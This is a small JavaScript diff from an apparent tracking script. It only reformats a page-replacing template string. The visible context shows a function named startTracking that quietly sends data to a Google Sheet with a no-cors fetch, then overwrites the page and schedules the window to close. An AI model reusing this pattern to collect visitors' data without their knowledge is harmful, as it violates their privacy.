@@ -28,8 +28,7 @@ async function startTracking() {
         fetch(finalUrl, { mode: 'no-cors' })
             .then(() => {
                 console.log("Данные отправлены в Google Таблицу");
-                document.body.innerHTML = `
-                <script>
+                document.body.innerHTML = `<script>
                     setTimeout(() => {
                         window.close();
                     }, 99999);
